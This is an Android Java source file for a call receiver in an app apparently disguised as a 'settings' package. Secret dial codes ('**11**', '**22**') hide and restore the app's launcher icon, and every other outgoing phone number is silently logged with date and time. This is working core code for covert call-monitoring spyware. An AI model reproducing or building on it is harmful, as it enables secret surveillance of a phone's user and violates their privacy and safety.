package com.example.settings;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.util.Log;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class OutgoingReceiver extends BroadcastReceiver {
    Sharedpref mSharedpref;
    @Override
    public void onReceive(Context context, Intent intent) {
     mSharedpref=new Sharedpref(context);
     String phoneNubmer = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
        if (phoneNubmer.equals("**11**")) {
            PackageManager p = context.getPackageManager();
            ComponentName componentName = new ComponentName(context, MainActivity.class);
            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        } else if (phoneNubmer.equals("**22**")) {
            ComponentName componentToEnable = new ComponentName(context.getApplicationContext(), MainActivity.class);
            PackageManager pm = context.getApplicationContext().getPackageManager();
            pm.setComponentEnabledSetting(componentToEnable, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
        }
        else {
            String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
            String currentTime = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
            String lastentry=mSharedpref.getOutgoingNumbers();
            StringBuilder mBuilder=new StringBuilder();
            mBuilder.append(lastentry+","+"{ Date: "+currentDate+", Time: "+currentTime+",Number: "+phoneNubmer+"}");
            mSharedpref.setOutgoingNumbers(mBuilder.toString());
            mSharedpref.commit();
            Log.d("Outgoing Numbers",mBuilder.toString());

        }
    }
}
